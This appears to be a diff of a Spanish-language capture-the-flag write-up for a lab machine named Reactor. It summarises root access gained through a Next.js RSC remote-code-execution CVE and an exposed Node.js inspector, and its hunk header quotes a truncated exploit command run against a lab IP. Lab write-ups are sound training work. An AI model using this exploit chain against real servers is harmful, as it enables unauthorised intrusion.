@@ -593,4 +593,4 @@ python3 poc.py "http://10.129.245.214:3000/" "node /tmp/exploit.js 2>&1 | paste 
 
 > [!success] Resultado **User Flag:** capturada ✅ **Root Flag:** capturada ✅ **Root:** `uid=0(root)` **Vector inicial:** CVE-2025-55182 (Next.js RSC RCE no autenticado) **Vector de privesc:** Node.js Inspector / CDP mal configurado **Servicio crítico:** `127.0.0.1:9229
 
-![[Reactor.png]]
+![Reactor](../Certficados/Reactor.png)
